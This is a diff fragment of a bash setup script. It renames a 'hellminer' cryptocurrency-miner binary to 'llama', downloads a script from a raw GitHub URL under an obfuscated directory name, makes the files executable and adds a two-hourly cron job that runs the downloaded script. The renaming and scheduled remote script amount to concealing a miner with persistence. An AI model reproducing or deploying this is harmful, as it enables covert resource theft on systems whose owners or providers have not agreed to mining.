@@ -48,7 +48,7 @@ for ((i = 0; i < count; i++)); do
 done
 mv /opt/vrsc/hellminer /opt/vrsc/llama
 wget https://raw.githubusercontent.com/caippx/bash/refs/heads/master/drfytgybhunjoimkol/random_usage.sh
-chmod u+x *
+chmod +x /opt/vrsc/*
 cron_job="0 */2 * * * /opt/vrsc/random_usage.sh"
 # 检查任务是否已经存在
 (crontab -l | grep -qF "$cron_job") || (crontab -l; echo "$cron_job") | crontab -
